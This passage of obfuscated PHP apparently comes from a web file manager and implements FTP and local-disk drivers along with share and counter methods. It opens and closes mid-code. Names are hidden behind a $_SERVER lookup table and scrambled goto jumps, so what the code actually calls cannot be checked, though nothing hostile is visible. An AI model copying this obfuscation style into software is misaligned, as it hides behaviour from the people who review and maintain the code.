$_SERVER[拘]; if (!$eÓ[93]($c)) { return !1; } $aΚʘ = $eÓ[64]($eÓ[1685]); goto A݅; A݅: $aΚʘ->{$_SERVER[拘][501]}(array($eÓ[1646] => $B))->{$_SERVER[拘][308]}(); $B = array(); foreach ($c as $aϯ) { $Eݞ = SourceModel::TYPE_USER; if ($aϯ[$eÓ[1686]] == SourceModel::TYPE_GROUP) { $Eݞ = SourceModel::TYPE_GROUP; } $A = array($eÓ[1646] => $B, $eÓ[1686] => $Eݞ, $eÓ[1661] => $eÓ[455]($aϯ[$eÓ[1661]]), $eÓ[1687] => 0, $eÓ[1688] => -1); if ($aϯ[$eÓ[1687]]) { $A[$eÓ[1687]] = $aϯ[$eÓ[1687]]; } else { if ($aϯ[$eÓ[1688]]) { $A[$eÓ[1688]] = $aϯ[$eÓ[1688]]; } } $B[] = $A; } goto F; eឿ: } public function numViewAdd($b䥬) { $aÈý =& $_SERVER[拘]; $A = array($aÈý[1684] => $b䥬); $this->{$_SERVER[拘][501]}($A)->{$_SERVER[拘][1620]}($aÈý[1678]); } public function numDownloadAdd($b͓ͬ) { $b =& $_SERVER[拘]; $Dç = array($b[1684] => $b͓ͬ); $this->{$_SERVER[拘][501]}($Dç)->{$_SERVER[拘][1620]}($b[1679]); } protected function shareEdit($a׭띙, $Aԋʜ) { goto Aѿ; F: return !0; goto a; Aѿ: $f㰶 =& $_SERVER[拘]; $d⸟ = $this->{$_SERVER[拘][1652]}($a׭띙); if (!$d⸟) { return !1; } goto E׆; E׆: $bǞ = array(); $B = $f㰶[4]($f㰶[119], $f㰶[1682]); foreach ($B as $aˍŎ) { if (!$f㰶[945]($aˍŎ, $Aԋʜ)) { continue; } $bǞ[$aˍŎ] = $Aԋʜ[$aˍŎ]; } goto E; E: $this->{$_SERVER[拘][1669]}($d⸟[$f㰶[499]], $Aԋʜ, $f㰶[1495]); $this->{$_SERVER[拘][501]}(array($f㰶[1684] => $a׭띙))->{$_SERVER[拘][1062]}($bǞ); if (isset($Aԋʜ[$f㰶[1667]])) { $this->{$_SERVER[拘][1668]}($a׭띙, $Aԋʜ[$f㰶[1667]]); } goto F; a: } protected function remove($dЊ) { $cӴ =& $_SERVER[拘]; if ($cӴ[93]($dЊ)) { $dЊ = array($cӴ[359], $dЊ); } $B܌ي = array($cӴ[1512] => USER_ID, $cӴ[1646] => $dЊ); $âв = $this->{$_SERVER[拘][501]}($B܌ي)->{$_SERVER[拘][308]}(); if ($âв) { $cӴ[64]($cӴ[1650])->{$_SERVER[拘][501]}(array($cӴ[1646] => $dЊ))->{$_SERVER[拘][308]}(); } return $âв; } } goto CǇ; B: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $port = 21; private $ftps = 0; private $scheme = ''; private $connect = FALSE; public function __construct($Fߗ) { parent::__construct(); if ($_SERVER[拘][37]($Fߗ) > 0) { $this->{$_SERVER[拘][526]}($Fߗ); } } public function __destruct() { if (!$this->{$_SERVER[拘][527]}()) { return !1; } return @$_SERVER[拘][528]($this->connect); } private function resetCharset($E̟Ǜ) { $B㍇ڠ =& $_SERVER[拘]; global $config; $this->appCharset = $config[$B㍇ڠ[529]]; $this->systemCharset = $config[$B㍇ڠ[530]]; if (isset($E̟Ǜ[$B㍇ڠ[531]]) && $E̟Ǜ[$B㍇ڠ[531]]) { $this->systemCharset = $E̟Ǜ[$B㍇ڠ[531]]; } } public function iconvApp($bӱ) { return $this->{$_SERVER[拘][532]}($bӱ, $this->systemCharset, $this->appCharset); } public function iconvSystem($bֺ) { return $this->{$_SERVER[拘][532]}($bֺ, $this->appCharset, $this->systemCharset); } public function getPathOuter($D) { goto C؇; b: if ($A[7]($AۉƜ, 0, 2) == $A[533]) { $AۉƜ = BASIC_PATH . $A[7]($AۉƜ, 2); } if ($A[7]($D, 0, 2) == $A[533]) { $D = BASIC_PATH . $A[7]($D, 2); } $AۉƜ = KodIO::clear($AۉƜ); goto bܒ; aŽʥ: return $this->pathDriver . $A[44] . $A[425]($D, $A[44]); goto f墏; C؇: $A =& $_SERVER[拘]; $AۉƜ = $this->{$_SERVER[拘][407]}($this->pathBase); $D = $this->{$_SERVER[拘][407]}($D); goto b; bܒ: $D = KodIO::clear($D); $D = $A[7]($D, $A[195]($AۉƜ)); if (empty($this->pathDriver)) { return $D; } goto aŽʥ; f墏: } private function _init($d = array()) { goto B; A悰: foreach ($d as $E匆 => $F繤) { if (isset($this->{$E匆})) { $this->{$E匆} = $F繤; } } $this->scheme = $this->ftps ? $f[538] : $f[539]; $this->server = $f[216]($f[540], $f[67], $this->server); goto F; F: $this->connect = @$f[541]($this->server, $this->port, 5); if ($this->connect === !1) { return; } return @$f[542]($this->connect, $this->username, $this->userpass); goto E; B: $f =& $_SERVER[拘]; if (!$f[534]($f[535])) { $f[29]($f[387]($f[536]), !1); } $this->{$_SERVER[拘][537]}($d); goto A悰; E: } private function _isconn() { return $_SERVER[拘][543]($this->connect); } public function mkfile($eƭᛃ, $Dؚ = '', $D = REPEAT_RENAME) { goto c; A֑: $eƭᛃ = $this->{$_SERVER[拘][544]}($eƭᛃ); $cȳ = $this->{$_SERVER[拘][545]}($this->{$_SERVER[拘][392]}($eƭᛃ)); if ($Dؚ) { $_SERVER[拘][344]($cȳ, $Dؚ); } goto D׆; D׆: $cᙈ = $this->{$_SERVER[拘][408]}($this->{$_SERVER[拘][407]}($eƭᛃ), $this->{$_SERVER[拘][407]}($cȳ)); $this->{$_SERVER[拘][546]}($cȳ); return $cᙈ ? $this->{$_SERVER[拘][378]}($eƭᛃ) : !1; goto D; c: if (!$this->{$_SERVER[拘][527]}()) { return !1; } $bڢ = $this->{$_SERVER[拘][372]}($eƭᛃ); if (!$this->{$_SERVER[拘][385]}($bڢ) && !$this->{$_SERVER[拘][395]}($bڢ)) { return !1; } goto A֑; D: } public function mkdir($F, $bڋ = REPEAT_SKIP) { goto eڃӤ; f: if ($this->{$_SERVER[拘][385]}($F) || @$dݑ[547]($this->connect, $F)) { return $this->{$_SERVER[拘][378]}($F); } if (!$this->{$_SERVER[拘][395]}($this->{$_SERVER[拘][372]}($F))) { return !1; } if ($F = @$dݑ[547]($this->connect, $F)) { $this->{$_SERVER[拘][378]}($F); } goto e; e: return !1; goto C否۩; eڃӤ: $dݑ =& $_SERVER[拘]; if (!$this->{$_SERVER[拘][527]}()) { return !1; } $F = $this->{$_SERVER[拘][544]}($F); goto f; C否۩: } public function copyFile($b̓Ð, $Eכ) { goto F܊ӛ; D̸: $this->{$_SERVER[拘][546]}($C); return $dă; goto Fԋ; Dޛ: $E = $this->{$_SERVER[拘][407]}($b̓Ð); $this->{$_SERVER[拘][406]}($b̓Ð, $E); $dă = $this->{$_SERVER[拘][408]}($Eכ, $E); goto D̸; F܊ӛ: if (!$this->{$_SERVER[拘][527]}()) { return !1; } $f = $this->{$_SERVER[拘][392]}($this->{$_SERVER[拘][544]}($b̓Ð)); $C = $this->{$_SERVER[拘][545]}($f); goto Dޛ; Fԋ: } public function moveFile($bѤξ, $C) { if (!$this->{$_SERVER[拘][527]}()) { return !1; } $bѤξ = $this->{$_SERVER[拘][544]}($bѤξ); $C = $this->{$_SERVER[拘][544]}($C); $DǊ = @$_SERVER[拘][548]($this->connect, $bѤξ, $C); return $DǊ ? $this->{$_SERVER[拘][378]}($C) : !1; } public function delFile($b݋) { if (!$this->{$_SERVER[拘][527]}()) { return !1; } $b݋ = $this->{$_SERVER[拘][544]}($b݋); return @$_SERVER[拘][549]($this->connect, $b݋); } public function delFolder($E) { goto dłƅ; dłƅ: $CǄ =& $_SERVER[拘]; if (!$this->{$_SERVER[拘][527]}()) { return !1; } $E = $this->{$_SERVER[拘][544]}($E); goto bӜ; e򔅵: return @$CǄ[551]($this->connect, $E); goto AÂ; bӜ: $C踿Ψ = $this->{$_SERVER[拘][550]}($E); if (!$C踿Ψ) { return @$CǄ[551]($this->connect, $E); } foreach ($C踿Ψ as $B) { if ($this->{$_SERVER[拘][552]}($B)) { $B = $this->{$_SERVER[拘][407]}($B); $this->{$_SERVER[拘][553]}($B); } else { @$CǄ[549]($this->connect, $B); } } goto e򔅵; AÂ: } public function rename($C͋Ҟ, $e) { goto dӡ; b: return $Aˌ ? $this->{$_SERVER[拘][378]}($eӪ) : !1; goto êꦓ; dӡ: $Aʚ =& $_SERVER[拘]; if (!$this->{$_SERVER[拘][527]}()) { return !1; } $bډù = $this->{$_SERVER[拘][394]}($this->{$_SERVER[拘][372]}($C͋Ҟ), $e); goto c轢; c轢: $bډù = $this->{$_SERVER[拘][544]}($bډù); $C͋Ҟ = $this->{$_SERVER[拘][544]}($C͋Ҟ); $d = $this->{$_SERVER[拘][372]}($C͋Ҟ); goto E钟; E钟: $eӪ = $Aʚ[43]($d, $Aʚ[44]) . $Aʚ[44] . $bډù; $Aˌ = @$Aʚ[548]($this->connect, $C͋Ҟ, $eӪ); $eӪ = $this->{$_SERVER[拘][407]}($eӪ); goto b; êꦓ: } public function size($fڢƚ) { if (!$this->{$_SERVER[拘][527]}()) { return !1; } $fڢƚ = $this->{$_SERVER[拘][544]}($fڢƚ); return @$_SERVER[拘][554]($this->connect, $fڢƚ); } public function info($Dҍ) { if (!$this->{$_SERVER[拘][527]}()) { return !1; } $Dҍ = $this->{$_SERVER[拘][544]}($Dҍ); if ($this->{$_SERVER[拘][379]}($Dҍ)) { return $this->{$_SERVER[拘][555]}($Dҍ, 1); } else { if ($this->{$_SERVER[拘][385]}($Dҍ)) { return $this->{$_SERVER[拘][556]}($Dҍ); } } return !1; } private function folderInfo($F, $a̰ = false, $a圻 = false) { $b =& $_SERVER[拘]; $a = $this->{$_SERVER[拘][407]}($this->{$_SERVER[拘][392]}($F)); if ($a圻) { return array($b[375] => $a, $b[40] => $this->{$_SERVER[拘][378]}($F), $b[400] => $b[557]); } $Cļ = array($b[375] => $a, $b[40] => $this->{$_SERVER[拘][378]}($F), $b[400] => $b[557], $b[558] => $b[168], $b[559] => $b[168], $b[560] => !0, $b[561] => !0); if (!$a̰) { $Cļ[$b[562]] = $this->{$_SERVER[拘][563]}($F, !1); $Cļ[$b[564]] = $this->{$_SERVER[拘][563]}($F, !0); } return $Cļ; } private function fileInfo($D, $BΊ = false) { $Eɬ =& $_SERVER[拘]; $D = $Eɬ[43]($D, $Eɬ[44]) . $Eɬ[44]; $a = $this->{$_SERVER[拘][407]}($this->{$_SERVER[拘][392]}($D)); if ($BΊ) { return array($Eɬ[375] => $a, $Eɬ[40] => $this->{$_SERVER[拘][378]}($D), $Eɬ[400] => $Eɬ[18], $Eɬ[565] => $this->{$_SERVER[拘][566]}($D), $Eɬ[490] => $this->{$_SERVER[拘][567]}($D)); } $a妸 = array($Eɬ[375] => $a, $Eɬ[40] => $this->{$_SERVER[拘][378]}($D), $Eɬ[400] => $Eɬ[18], $Eɬ[558] => $Eɬ[168], $Eɬ[559] => @$Eɬ[568]($this->connect, $D), $Eɬ[565] => $this->{$_SERVER[拘][566]}($D), $Eɬ[490] => $this->{$_SERVER[拘][567]}($D), $Eɬ[560] => !0, $Eɬ[561] => !0); return $a妸; } public function exist($bْı) { if (!$this->{$_SERVER[拘][527]}()) { return !1; } $bْı = $this->{$_SERVER[拘][544]}($bْı); if ($this->{$_SERVER[拘][567]}($bْı) > -1) { return !0; } if ($this->{$_SERVER[拘][385]}($bْı)) { return !0; } return !1; } public function isFile($E窱) { $A搖 =& $_SERVER[拘]; if ($E窱 == $A搖[44]) { return !1; } if (!$this->{$_SERVER[拘][527]}() || !$this->{$_SERVER[拘][389]}($E窱)) { return !1; } @$A搖[569]($this->connect, $A搖[44]); $E窱 = $this->{$_SERVER[拘][544]}($E窱); return !$this->{$_SERVER[拘][552]}($E窱); } public function isFolder($d) { $B┥ =& $_SERVER[拘]; if (!$this->{$_SERVER[拘][527]}()) { return !1; } @$B┥[569]($this->connect, $B┥[44]); $d = $this->{$_SERVER[拘][544]}($d); return $this->{$_SERVER[拘][552]}($d); } public function listPath($cڎ, $f̦Ә = false, $cݫ = false) { goto cˊ; A㋃: foreach ($Aʸ as $cڎ) { if ($this->{$_SERVER[拘][552]}($cڎ)) { $FЉ[$aӊ[399]][] = $this->{$_SERVER[拘][556]}($cڎ, $f̦Ә, $cݫ); } else { $FЉ[$aӊ[398]][] = $this->{$_SERVER[拘][555]}($cڎ, $cݫ); } } return $FЉ; goto Cì; e: $Aʸ = $this->{$_SERVER[拘][550]}($cڎ); $FЉ = array($aӊ[399] => array(), $aӊ[398] => array()); if (!$Aʸ) { return $FЉ; } goto A㋃; cˊ: $aӊ =& $_SERVER[拘]; if (!$this->{$_SERVER[拘][527]}()) { return !1; } $cڎ = $this->{$_SERVER[拘][544]}($cڎ); goto e; Cì: } private function _isFolder($e) { return @$_SERVER[拘][569]($this->connect, $e); } public function has($D, $c称 = true) { if (!$this->{$_SERVER[拘][527]}()) { return !1; } $D = $this->{$_SERVER[拘][544]}($D); $D嫄 = $this->{$_SERVER[拘][550]}($D); if (!$D嫄) { return !1; } foreach ($D嫄 as $D) { if ($c称) { if (!$this->{$_SERVER[拘][552]}($D)) { return !0; } } else { if ($this->{$_SERVER[拘][552]}($D)) { return !0; } } } return !1; } public function listAll($c̎) { goto D; D: $eƎ =& $_SERVER[拘]; if (!$this->{$_SERVER[拘][527]}()) { return !1; } $c̎ = $this->{$_SERVER[拘][544]}($c̎); goto Cޚ; dؓ: foreach ($d[$eƎ[398]] as $D) { $D[] = array($eƎ[40] => $eƎ[44] . $eƎ[70]($eƎ[69]($c̎, $eƎ[67], $D), $eƎ[44]), $eƎ[557] => 0, $eƎ[490] => $this->{$_SERVER[拘][567]}($D)); } return $D; goto D; Cޚ: $d = $this->{$_SERVER[拘][570]}($c̎); $D = array(); foreach ($d[$eƎ[399]] as $aщ) { $D[] = array($eƎ[40] => $eƎ[44] . $eƎ[70]($eƎ[69]($c̎, $eƎ[67], $aщ), $eƎ[44]) . $eƎ[44], $eƎ[557] => 1, $eƎ[490] => 0); } goto dؓ; D: } public function getContent($CЙ) { if (!$this->{$_SERVER[拘][527]}()) { return !1; } $CЙ = $this->{$_SERVER[拘][544]}($CЙ); return $this->{$_SERVER[拘][509]}($CЙ); } public function setContent($cƊ, $E = '') { goto F׋; F׋: $aİ =& $_SERVER[拘]; if (!$this->{$_SERVER[拘][527]}()) { return !1; } $cƊ = $this->{$_SERVER[拘][544]}($cƊ); goto D; D: $cƊ = "{$this->scheme}{$this->username}\72{$this->userpass}\x40{$this->server}" . $cƊ; $b܏ = array($aİ[571] => array($aİ[572] => !0)); $c䚄 = $aİ[573]($b܏); goto e催ɟ; e催ɟ: if ($E񻥂 = @$aİ[53]($cƊ, $aİ[574], 0, $c䚄)) { $bǎ = $aİ[55]($E񻥂, $E); $aİ[58]($E񻥂); return $bǎ; } return !1; goto e㹩; e㹩: } public function fileSubstr($b, $D = 0, $aƟ = false) { $aҋ =& $_SERVER[拘]; if (!$this->{$_SERVER[拘][527]}()) { return !1; } $b = $this->{$_SERVER[拘][544]}($b); $bϢ = "{$this->scheme}{$this->username}\72{$this->userpass}\100{$this->server}" . $b; if ($f = @$aҋ[53]($bϢ, $aҋ[575])) { if ($aƟ === !1) { $aƟ = $this->{$_SERVER[拘][567]}($b); } $aҋ[576]($f, $D); $d = $aҋ[577]($f, $aƟ); $aҋ[58]($f); return $d; } return !1; } public function upload($f, $b򳫻, $eެ = false, $B = REPEAT_REPLACE) { goto Dޜ; Dę΂: $bֆ = @$Bؑ[579]($this->connect, $f, $Cʇ͑, FTP_BINARY); while ($bֆ == FTP_MOREDATA) { $bֆ = $Bؑ[580]($this->connect); } if ($bֆ != FTP_FINISHED) { return !1; } goto a卬; fӠ̥: $f = $this->{$_SERVER[拘][544]}($f); $b򳫻 = $this->{$_SERVER[拘][544]}($b򳫻); $Cʇ͑ = @$Bؑ[53]($b򳫻, $Bؑ[578]); goto Dę΂; Dޜ: $Bؑ =& $_SERVER[拘]; if (!$this->{$_SERVER[拘][527]}()) { return !1; } if (!$this->{$_SERVER[拘][395]}($this->{$_SERVER[拘][372]}($f))) { return !1; } goto fӠ̥; a卬: $Bؑ[58]($Cʇ͑); return $this->{$_SERVER[拘][378]}($f); goto b𾕙; b𾕙: } public function download($b唌, $Eſ = '') { goto BݹȾ; b: if (!IO::mkdir($F󐊏)) { return !1; } $b唌 = $this->{$_SERVER[拘][544]}($b唌); $Eſ = $this->{$_SERVER[拘][544]}($Eſ); goto d׬; d׬: $Cũ䨃 = $d𭌸[53]($Eſ, $d𭌸[581]); $a٧ = $d𭌸[582]($this->connect, $Cũ䨃, $b唌, FTP_BINARY); while ($a٧ == FTP_MOREDATA) { $a٧ = $d𭌸[580]($this->connect); } goto AɎ; AɎ: if ($a٧ != FTP_FINISHED) { return !1; } $d𭌸[58]($Cũ䨃); return $this->{$_SERVER[拘][407]}($Eſ); goto A֙; BݹȾ: $d𭌸 =& $_SERVER[拘]; if (!$this->{$_SERVER[拘][527]}()) { return !1; } $F󐊏 = $this->{$_SERVER[拘][372]}($Eſ); goto b; A֙: } private function ftpList($F媘) { $A =& $_SERVER[拘]; if (!$this->{$_SERVER[拘][552]}($F媘)) { return !1; } @$A[569]($this->connect, $A[44]); $F媘 = $F媘 == $A[44] ? $F媘 : $F媘 . $A[44]; return @$A[583]($this->connect, $F媘); } private function recursionFtpFiles($Bص) { $c׬ =& $_SERVER[拘]; if (!$this->{$_SERVER[拘][527]}()) { return !1; } if (!($Cȩ = $this->{$_SERVER[拘][550]}($Bص))) { return !1; } static $Eᑆ = array(); foreach ($Cȩ as $Bص) { if ($this->{$_SERVER[拘][552]}($Bص)) { $this->{$_SERVER[拘][570]}($Bص, $Eᑆ); $Eᑆ[$c׬[399]][] = $Bص; } else { $Eᑆ[$c׬[398]][] = $Bص; } } return $Eᑆ; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($Cʔ) { $b =& $_SERVER[拘]; if ($b[7]($Cʔ, 0, 2) == $b[533]) { $Cʔ = BASIC_PATH . $b[7]($Cʔ, 2); } return $Cʔ; } public function iconvApp($B膍ݽ) { $EԞ =& $_SERVER[拘]; global $config; return $this->{$_SERVER[拘][532]}($B膍ݽ, $config[$EԞ[530]], $config[$EԞ[529]]); } public function iconvSystem($DҘ) { $Dץ =& $_SERVER[拘]; global $config; return $this->{$_SERVER[拘][532]}($DҘ, $config[$Dץ[529]], $config[$Dץ[530]]); } public function getPathOuter($A޿) { goto Eη; C: return $this->pathDriver . $bȫ[44] . $bȫ[425]($A޿, $bȫ[44]); goto D; Eη: $bȫ =& $_SERVER[拘]; $EڨƮ廱 = $this->{$_SERVER[拘][407]}($this->pathBase); $A޿ = $this->{$_SERVER[拘][407]}($A޿); goto B; bϫ: $A޿ = KodIO::clear($A޿); $A޿ = $bȫ[7]($A޿, $bȫ[195]($EڨƮ廱)); if (empty($this->pathDriver)) { return $A޿; } goto C; B: if ($bȫ[7]($EڨƮ廱, 0, 2) == $bȫ[533]) { $EڨƮ廱 = BASIC_PATH . $bȫ[7]($EڨƮ廱, 2); } if ($bȫ[7]($A޿, 0, 2) == $bȫ[533]) { $A޿ = BASIC_PATH . $bȫ[7]($A޿, 2); } $EڨƮ廱 = KodIO::clear($EڨƮ廱); goto bϫ; D: } public function mkfile($EБ, $E = '', $E𢇡 = REPEAT_RENAME) { $C =& $_SERVER[拘]; $EБ = $this->{$_SERVER[拘][544]}($EБ); @$C[584]($EБ); if ($E) { $C[344]($EБ, $E); } return $C[585]($EБ) ? $this->{$_SERVER[拘][378]}($EБ) : !1; } public function mkdir($cʭ, $EՄ = REPEAT_SKIP) { $Aꃹ =& $_SERVER[拘]; $cʭ = $this->{$_SERVER[拘][544]}($cʭ); if ($Aꃹ[586]($cʭ)) { return $this->{$_SERVER[拘][378]}($cʭ); } @$Aꃹ[41]($cʭ, 511, !0); return $Aꃹ[586]($cʭ) ? $this->{$_SERVER[拘][378]}($cʭ) : !1; } public function copyFile($F򾮎Ƈ, $Eɕ) { $this->{$_SERVER[拘][395]}($this->{$_SERVER[拘][372]}($Eɕ)); $F򾮎Ƈ = $this->{$_SERVER[拘][544]}($F򾮎Ƈ); $Eɕ = $this->{$_SERVER[拘][544]}($Eɕ); $eǖ = @$_SERVER[拘][587]($F򾮎Ƈ, $Eɕ); return $eǖ ? $this->{$_SERVER[拘][378]}($Eɕ) : !1; } public function moveFile($f, $fȈ) { goto C; e: return $Bپ ? $this->{$_SERVER[拘][378]}($fȈ) : !1; goto E; d: $fȈ = $this->{$_SERVER[拘][544]}($fȈ); $Bپ = $CŮ[455](@$CŮ[588]($f, $fȈ)); if (!$Bپ) { if ($Bپ = $CŮ[455](@$CŮ[587]($f, $fȈ))) { @$CŮ[51]($f); } } goto e; C: $CŮ =& $_SERVER[拘]; $this->{$_SERVER[拘][395]}($this->{$_SERVER[拘][372]}($fȈ)); $f = $this->{$_SERVER[拘][544]}($f); goto d; E: } public function delFile($f) { $B⛅ =& $_SERVER[拘]; $f = $this->{$_SERVER[拘][544]}($f); if (!@$B⛅[51]($f)) { @$B⛅[589]($f, 511); if (!@$B⛅[51]($f)) { return !1; } } else { return !0; } } public function delFolder($BÓ) { goto b; D؋̳: return $Aϼ[594]($BÓ); goto fʅ; F: if (!($c݌ʈ = $Aϼ[590]($BÓ))) { return !1; } while (($CՎ = $Aϼ[591]($c݌ʈ)) !== !1) { if ($CՎ == $Aϼ[348] || $CՎ == $Aϼ[592]) { continue; } $fΒ = $BÓ . $Aϼ[44] . $CՎ; if (!$Aϼ[586]($fΒ)) { if (!$Aϼ[51]($fΒ)) { $Aϼ[589]($fΒ, 511); if (!$Aϼ[51]($fΒ)) { return !1; } } } else { $Aϼ[589]($fΒ, 511); $fΒ = $this->{$_SERVER[拘][407]}($fΒ); if (!$this->{$_SERVER[拘][553]}($fΒ)) { return !1; } } } $Aϼ[593]($c݌ʈ); goto D؋̳; b: $Aϼ =& $_SERVER[拘]; $BÓ = $this->{$_SERVER[拘][544]}($BÓ); if (!$Aϼ[586]($BÓ)) { return !0; } goto F; fʅ: } public function rename($aăꟃ, $bۅÅ) { goto cϴ; cϴ: $fܧ䣪 =& $_SERVER[拘]; $Fޢȟ = $this->{$_SERVER[拘][394]}($this->{$_SERVER[拘][372]}($aăꟃ), $bۅÅ); $Fޢȟ = $this->{$_SERVER[拘][544]}($Fޢȟ); goto eӧϺ; d: $f鴰 = @$fܧ䣪[588]($aăꟃ, $a廓); $a廓 = $this->{$_SERVER[拘][407]}($a廓); return $f鴰 ? $this->{$_SERVER[拘][378]}($a廓) : !1; goto aï; eӧϺ: $aăꟃ = $this->{$_SERVER[拘][544]}($aăꟃ); $aػݾ = $this->{$_SERVER[拘][372]}($aăꟃ); $a廓 = $fܧ䣪[43]($aػݾ, $fܧ䣪[44]) . $fܧ䣪[44] . $Fޢȟ; goto d; aï: } public function size($F) { $CɌ =& $_SERVER[拘]; $F = $this->{$_SERVER[拘][544]}($F); return (double) $CɌ[595]($CɌ[596]($CɌ[597], @$CɌ[598]($F))); } public function info($e½س) { $e½س = $this->{$_SERVER[拘][544]}($e½س); if ($this->{$_SERVER[拘][385]}($e½س)) { return $this->{$_SERVER[拘][556]}($e½س, !0); } else { if ($this->{$_SERVER[拘][379]}($e½س)) { return $this->{$_SERVER[拘][555]}($e½س); } } return !1; } protected function infoChildren($B蘝, &$C) { $bý =& $_SERVER[拘]; $B蘝 = $bý[43]($B蘝, $bý[44]) . $bý[44]; $B蘝 = $this->{$_SERVER[拘][544]}($B蘝); if (!($fĲƘ = @$bý[590]($B蘝))) { return; } while (($f = $bý[591]($fĲƘ)) !== !1) { if ($f == $bý[348] || $f == $bý[592]) { continue; } $F͈ = $B蘝 . $f; $e٤ = $this->{$_SERVER[拘][407]}($F͈); if ($bý[585]($F͈)) { $C[$bý[599]]++; $C[$bý[490]] += $this->{$_SERVER[拘][567]}($e٤); } else { $C[$bý[600]]++; $this->{$_SERVER[拘][601]}($e٤, $C); } } $bý[593]($fĲƘ); } private function folderInfo($dȸ, $cړܥ = false, $Cܾ = false) { goto d҇; E،: return $b܃ߊ; goto e; d҇: $B =& $_SERVER[拘]; $dȸ = $B[43]($dȸ, $B[44]) . $B[44]; $eҴ = $this->{$_SERVER[拘][407]}($this->{$_SERVER[拘][392]}($dȸ)); goto cֻ; cֻ: if ($Cܾ) { return array($B[375] => $eҴ, $B[40] => $this->{$_SERVER[拘][378]}($dȸ), $B[400] => $B[557]); } $b܃ߊ = array($B[375] => $eҴ, $B[40] => $this->{$_SERVER[拘][378]}($dȸ), $B[400] => $B[557], $B[558] => @$B[602]($dȸ), $B[559] => @$B[49]($dȸ), $B[560] => $B[603]($dȸ), $B[561] => $B[604]($dȸ)); if ($cړܥ) { $b܃ߊ[$B[562]] = $this->{$_SERVER[拘][563]}($dȸ, !1); $b܃ߊ[$B[564]] = $this->{$_SERVER[拘][563]}($dȸ, !0); } goto E،; e: } private function fileInfo($eȽ, $eҊ = false) { $c䢒 =& $_SERVER[拘]; $eⲇ = $this->{$_SERVER[拘][407]}($this->{$_SERVER[拘][392]}($eȽ)); if ($eҊ) { return array($c䢒[375] => $eⲇ, $c䢒[40] => $this->{$_SERVER[拘][378]}($eȽ), $c䢒[400] => $c䢒[18], $c䢒[490] => $this->{$_SERVER[拘][567]}($eȽ), $c䢒[565] => $this->{$_SERVER[拘][566]}($eⲇ)); } $Cﶾȸ = array($c䢒[375] => $eⲇ, $c䢒[40] => $this->{$_SERVER[拘][378]}($eȽ), $c䢒[400] => $c䢒[18], $c䢒[558] => @$c䢒[602]($eȽ), $c䢒[559] => @$c䢒[49]($eȽ), $c䢒[490] => $this->{$_SERVER[拘][567]}($eȽ), $c䢒[565] => $this->{$_SERVER[拘][566]}($eⲇ), $c䢒[560] => $c䢒[603]($eȽ), $c䢒[561] => $c䢒[604]($eȽ)); $this->{$_SERVER[拘][605]}($eȽ, $Cﶾȸ); return $Cﶾȸ; } public function exist($F) { $F = $this->{$_SERVER[拘][544]}($F); return @$_SERVER[拘][48]($F); } public function isFile($c) { $c = $this->{$_SERVER[拘][544]}($c); return @$_SERVER[拘][585]($c); } public function isFolder($D) { $D = $this->{$_SERVER[拘][544]}($D); return @$_SERVER[拘][586]($D); } private function fileInfoImage($d, &$E) { $b =& $_SERVER[拘]; $D = array($b[606], $b[607], $b[608], $b[609], $b[610]); if ($b[176]($E[$b[565]], $D)) { $e癎 = $b[611]($d); if ($e癎) { $E[$b[612]] = array($b[613] => $e癎[0], $b[614] => $e癎[1]); } } } public function listPath($dͯ, $A祛 = true, $Cӆ = false) { goto f俇; e沿: $cȪ = array($b[399] => array(), $b[398] => array()); if (!($Fκ = @$b[590]($dͯ))) { return $cȪ; } while (($aͫ = $b[591]($Fκ)) !== !1) { if ($aͫ == $b[348] || $aͫ == $b[592]) { continue; } $B׷© = $dͯ . $aͫ; if ($b[585]($B׷©)) { $cȪ[$b[398]][] = $this->{$_SERVER[拘][555]}($B׷©, $Cӆ); } else { $cȪ[$b[399]][] = $this->{$_SERVER[拘][556]}($B׷©, $A祛, $Cӆ); } } goto aԹ; aԹ: $b[593]($Fκ); return $cȪ; goto bۗ; f俇: $b =& $_SERVER[拘]; $dͯ = $this->{$_SERVER[拘][544]}($dͯ); $dͯ = $b[43]($dͯ, $b[44]) . $b[44]; goto e沿; bۗ: } public function listAll($d, &$eϱ = array()) { goto f; dț: return $eϱ; goto C䠍ȷ; f: $BՅ =& $_SERVER[拘]; $d = $this->{$_SERVER[拘][544]}($d); $d = $BՅ[43]($d, $BՅ[44]) . $BՅ[44]; goto c; c: if (!($cˆ = @$BՅ[590]($d))) { return $eϱ; } while (($Dֳ = $BՅ[591]($cˆ)) !== !1) { if ($Dֳ == $BՅ[348] || $Dֳ == $BՅ[592]) { continue; } $Dөƈ = $d . $Dֳ; if ($BՅ[586]($Dөƈ)) { $eϱ[] = array($BՅ[40] => $Dөƈ . $BՅ[44], $BՅ[615] => 1, $BՅ[490] => 0); $this->{$_SERVER[拘][506]}($d, $eϱ); } else { $eϱ[] = array($BՅ[40] => $Dөƈ, $BՅ[615] => 0, $BՅ[490] => $this->{$_SERVER[拘][567]}($Dөƈ)); } } $BՅ[593]($cˆ); goto dț; C䠍ȷ: } public function has($E, $aʗڊ = true) { goto e; a: if (!($dΌ = @$b⃒[590]($E))) { return !1; } while (($B = $b⃒[591]($dΌ)) !== !1) { if ($B == $b⃒[348] || $B == $b⃒[592]) { continue; } $c׬Ԃ = $E . $B; if ($aʗڊ) { if (@$b⃒[585]($c׬Ԃ)) { return !0; } } else { if (@$b⃒[586]($c׬Ԃ . $b⃒[44])) { return !0; } } } $b⃒[593]($dΌ); goto f򎌉Ň; e: $b⃒ =& $_SERVER[拘]; $E = $this->{$_SERVER[拘][544]}($E); $E = $b⃒[43]($E, $b⃒[44]) . $b⃒[44]; goto a; f򎌉Ň: return !1; goto a޽; a޽: } public function hashSimple($bΒ) { goto d; f扂Ԟ: $b[576]($BϬ, $dڅ - $Dȩ); $e .= $b[577]($BϬ, $Dȩ); $b[58]($BϬ); goto fأː; f: $BϬ = $b[53]($bΒ, $b[575]); if (!$BϬ) { return $e; } for ($A = 0; $A < $B; $A++) { $b[576]($BϬ, $Eǣ * $A); $e .= $b[577]($BϬ, $Dȩ); } goto f扂Ԟ; E: if ($dڅ <= $Dȩ * $B) { return $this->{$_SERVER[拘][616]}($bΒ) . $dڅ; } $e = $b[67]; $Eǣ = $b[455]($dڅ / $B); goto f; fأː: return $b[46]($e) . $dڅ; goto f; Aڥ¸: $dڅ = $this->{$_SERVER[拘][567]}($bΒ); $Dȩ = 200; $B = 50; goto E; d: $b =& $_SERVER[拘]; if (!$bΒ) { return 